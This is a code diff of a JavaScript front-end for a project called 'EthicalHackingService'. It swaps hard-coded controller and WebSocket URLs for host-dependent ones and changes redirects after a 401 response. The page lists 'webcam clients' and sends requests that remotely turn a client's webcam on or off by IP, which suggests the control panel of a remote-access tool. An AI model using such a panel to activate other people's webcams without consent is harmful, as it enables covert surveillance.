@@ -2,6 +2,16 @@
 var webcamIntervalId;
 var webcamClientIP;
 var img = document.getElementById("webcamImage");
+var ajaxURL;
+var wsURL;
+
+if (location.hostname == 'localhost') {
+	ajaxURL = location.protocol + '//' + location.host + '/ROOT/AppController';
+	wsURL = 'ws://' + location.host + '/ROOT/actions';
+} else {
+	ajaxURL = location.protocol + '//' + location.host + '/AppController';
+	wsURL = 'ws://' + location.host + ':8000/actions';
+}
 
 // -----------------Webcam-AjaxSwitch Script - Start----------------- //
 (function() {
@@ -13,7 +23,7 @@ var img = document.getElementById("webcamImage");
 	
 	$.ajax({
 		type : "POST",
-		url : "/EthicalHackingService/AppController",
+		url : ajaxURL,
 		data : "requestType=getWebcamClients",
 		success : function(response) {
 			if (response.status == "success") {
@@ -43,8 +53,12 @@ var img = document.getElementById("webcamImage");
 			}
 		},
 		error : function(xhr) {
-			if (xhr.status == 401) {
-				location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
+			if(xhr.status == 401) {
+				if(location.hostname == 'localhost') {
+					location.href = location.protocol + '//' + location.host + '/ROOT';
+				} else {
+					location.href = location.protocol + '//' + location.host;
+				}
 			}
 		}
 	});
@@ -58,7 +72,7 @@ var img = document.getElementById("webcamImage");
 		
 		$.ajax({
 			type : "POST",
-			url : "/EthicalHackingService/AppController",
+			url : ajaxURL,
 			data : "requestType=webcamSwitch&clientIP="+ webcamClientIP + "&turnOnCam=no",
 			success : function(response) {
 				if (response.status == "success") {
@@ -68,8 +82,12 @@ var img = document.getElementById("webcamImage");
 				}
 			},
 			error : function(xhr) {
-				if (xhr.status == 401) {
-					location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
+				if(xhr.status == 401) {
+					if(location.hostname == 'localhost') {
+						location.href = location.protocol + '//' + location.host + '/ROOT';
+					} else {
+						location.href = location.protocol + '//' + location.host;
+					}
 				}
 			}
 		});
@@ -117,7 +135,7 @@ function showWebcamFeed(clientIP) {
 	
 	$.ajax({
 		type : "POST",
-		url : "/EthicalHackingService/AppController",
+		url : ajaxURL,
 		data : "requestType=webcamSwitch&clientIP="+ webcamClientIP + "&turnOnCam=yes",
 		success : function(response) {
 			if (response.status == "success") {
@@ -127,8 +145,12 @@ function showWebcamFeed(clientIP) {
 			}
 		},
 		error : function(xhr) {
-			if (xhr.status == 401) {
-				location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
+			if(xhr.status == 401) {
+				if(location.hostname == 'localhost') {
+					location.href = location.protocol + '//' + location.host + '/ROOT';
+				} else {
+					location.href = location.protocol + '//' + location.host;
+				}
 			}
 		}
 	});
@@ -138,7 +160,7 @@ function showWebcamFeed(clientIP) {
 //------------------------------------------------------------------ //
 
 //-----------------Webcam-WebSocket Script - Start----------------- //
-var socket = new WebSocket("ws://siddhant3146324:8080/EthicalHackingService/actions");
+var socket = new WebSocket(wsURL);
 
 socket.onopen = function() {
 	//console.log("Opened connection to websocket!");
